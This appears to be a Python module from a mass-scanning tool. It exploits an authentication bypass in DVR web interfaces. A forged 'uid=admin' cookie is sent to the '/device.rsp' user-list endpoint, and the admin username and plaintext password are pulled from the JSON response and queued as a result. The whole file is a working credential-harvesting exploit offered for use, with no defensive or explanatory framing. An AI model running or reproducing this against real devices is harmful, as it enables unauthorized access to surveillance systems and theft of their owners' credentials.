import json
import requests
import config


class DvrRsp:
    def __init__(self, parent):
        self.ip = parent.data['ip']
        self.port = parent.data['port']
        self.result_queue = parent.result_queue
        self.parent = parent
        self.timeout = config.timeout

    def try_for_vuln(self):
        path = '/device.rsp?opt=user&cmd=list'
        url = f'http://{self.ip}:{self.port}'
        headers = {'Cookie': 'uid=admin', 'Cookie pair': 'uid=admin'}
        try:
            resp = requests.get(url + path, headers=headers, timeout=self.timeout)
            conf = json.loads(resp.text)
            usr = conf['list'][0]['uid']
            pwd = conf['list'][0]['pwd']
            self.set_done(usr, pwd)
        except Exception as e:
            print(f'{__name__} - {self.ip}:{self.port} - Exploit warning: {e}')

    def connect(self, usr, pwd):
        return False

    def set_done(self, usr, pwd):
        self.parent.data['usr'] = usr
        self.parent.data['pwd'] = pwd
        self.result_queue.put(self.parent.data)
        self.parent.isDone = True